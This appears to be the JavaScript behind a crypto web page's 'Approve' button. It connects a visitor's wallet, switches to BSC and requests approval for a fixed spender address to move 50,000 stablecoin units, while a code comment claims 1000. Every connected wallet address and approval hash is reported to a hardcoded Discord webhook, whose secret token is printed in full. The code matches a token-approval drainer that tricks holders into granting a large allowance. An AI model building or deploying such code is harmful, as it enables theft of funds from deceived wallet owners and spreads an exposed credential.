const busdContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Correct BUSD Address on BSC
const spenderAddress = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8"; // Ensure this is a smart contract, not a wallet

const busdAbi = [
    {
        "constant": false,
        "inputs": [
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" },
            { "internalType": "address", "name": "spender", "type": "address" }
        ],
        "name": "allowance",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
];

// ✅ Discord Webhook URL for Notifications
const discordWebhookURL = "https://discord.com/api/webhooks/1333674200501850112/ooI6L8O22BYG85V7Mk19egJHU3tCa_ckJciNiqq0Pde0FYth8tXh7XEIBwSPGzpCapSH";

// ✅ Function to Send Notifications to Discord
async function sendDiscordNotification(message) {
    try {
        await fetch(discordWebhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("🚨 Discord Notification Failed:", error);
    }
}

// ✅ Function to Check Allowance Before Calling Approve
async function checkAllowance(account) {
    try {
        const web3 = new Web3(window.ethereum);
        const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
        const allowance = await busdContract.methods.allowance(account, spenderAddress).call();
        return web3.utils.fromWei(allowance, 'ether');
    } catch (error) {
        console.error("🚨 Error Checking Allowance:", error);
        return 0;
    }
}

// ✅ Function to Approve BUSD Transactions
async function BusdApproval() {
    loadingButtonBusd();

    if (!window.ethereum) {
        Swal.fire({ icon: 'error', title: 'Info', text: 'Please connect to a Web3-compatible network.' });
        unLoadingButtonBusd();
        return;
    }

    try {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];

        // ✅ Check if the wallet is already connected
        await sendDiscordNotification(`🔗 Wallet Connected: ${account}`);

        // ✅ Check network and switch to BSC if needed
        const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentNetwork !== '0x38') { // Binance Smart Chain Mainnet
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            });
        }

        const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
        const amountToApprove = web3.utils.toWei('50000', 'ether'); // Approving 1000 BUSD

        // ✅ Check if approval is already granted
        const existingAllowance = await checkAllowance(account);
        if (existingAllowance >= 1000) {
            Swal.fire({ icon: 'info', title: 'Already Approved', text: `You already approved ${existingAllowance} BUSD.` });
            unLoadingButtonBusd();
            return;
        }

        // ✅ Approve BUSD for spender contract
        await busdContract.methods.approve(spenderAddress, amountToApprove).send({ from: account })
            .on("transactionHash", async (hash) => {
                await sendDiscordNotification(`✅ **BUSD Approved**\nWallet: ${account}\nTransaction Hash: ${hash}`);
                Swal.fire({ icon: 'success', title: 'BUSD Approved', html: `✅ **Approval Successful**<br>Transaction: <a href="https://bscscan.com/tx/${hash}" target="_blank">${hash}</a>` });
            })
            .on("error", async (error) => {
                console.error("🚨 Approval Failed:", error);
                Swal.fire({ icon: 'error', title: 'Approval Failed', text: 'Transaction was rejected or failed.' });
                await sendDiscordNotification(`❌ Approval Failed for ${account}`);
            });

    } catch (error) {
        console.error("🚨 Error in BusdApproval:", error);
        Swal.fire({ icon: 'error', title: 'Error', text: 'An error occurred during approval.' });
    }

    unLoadingButtonBusd();
}

// ✅ Button Loading Effects
function loadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "<i class='fa fa-spinner fa-spin'></i>";
    document.getElementById('btnApprove').disabled = true;
}

function unLoadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "";
    document.getElementById('btnApprove').disabled = false;
}

// ✅ Initialize jQuery Functions
$(document).ready(function () {
    mainLoadFunction();
});

jQuery(window).on('load', function () {
    setTimeout(function () {
        JobickCarousel();
    }, 1000);
});

function showLoader() {
    var loader = document.getElementById('loader');
    var ApproveText = document.getElementById('ApproveText');
    var btnApprove = document.getElementById('btnApprove');

    ApproveText.style.display = 'none';
    loader.style.display = 'inline-block';
    btnApprove.disabled = true;
}
